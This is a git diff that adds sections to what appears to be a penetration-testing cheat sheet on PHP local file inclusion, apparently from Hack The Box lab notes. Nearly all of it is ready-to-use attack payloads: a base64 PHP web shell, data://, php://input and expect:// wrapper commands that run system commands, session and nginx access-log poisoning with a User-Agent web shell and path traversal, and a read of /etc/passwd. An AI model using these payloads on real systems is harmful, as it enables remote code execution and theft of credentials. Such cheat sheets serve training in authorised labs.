@@ -25,7 +25,21 @@ Base64 PHP Shell
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' | base64
 ```
-
+#### PHP Wrappers
+```
+[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+#### PHP Session Poisoning
+```
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+```
+[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+[/htb]$ curl -s http://83.136.252.44:46301/ilf_admin/index.php?log=../../../../../../../../../../../../../var/log/nginx/access.log&cmd=id
+```
 # Useful Payloads
 ```php
 <?php file_get_contents('/etc/passwd'); ?>
